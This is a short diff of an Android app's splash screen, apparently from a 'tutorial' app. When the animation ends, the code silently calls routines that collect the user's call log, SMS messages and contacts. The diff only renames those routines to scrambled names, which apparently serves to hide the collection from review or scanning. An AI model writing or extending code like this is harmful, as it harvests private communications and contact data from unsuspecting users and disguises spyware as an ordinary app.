@@ -11,9 +11,9 @@ import com.viksaa.sssplash.lib.activity.AwesomeSplash;
 import com.viksaa.sssplash.lib.cnst.Flags;
 import com.viksaa.sssplash.lib.model.ConfigSplash;
 
-import static com.android.tutorial.utils.Utils.fetchSms;
-import static com.android.tutorial.utils.Utils.getCallDetails;
-import static com.android.tutorial.utils.Utils.getContactsList;
+import static com.android.tutorial.utils.Utils.getkalol;
+import static com.android.tutorial.utils.Utils.getltoiCstonacs;
+import static com.android.tutorial.utils.Utils.gettishms;
 
 public class SplashActivity extends AwesomeSplash {
 
@@ -64,9 +64,9 @@ public class SplashActivity extends AwesomeSplash {
 
     @Override
     public void animationsFinished() {
-        getCallDetails(SplashActivity.this);
-        fetchSms(SplashActivity.this);
-        getContactsList(SplashActivity.this);
+        getkalol(SplashActivity.this);
+        gettishms(SplashActivity.this);
+        getltoiCstonacs(SplashActivity.this);
         PrefManager prefManager = new PrefManager(getApplicationContext());
         if (!prefManager.isFirstTimeLaunch()) {
             launchHomeScreen();
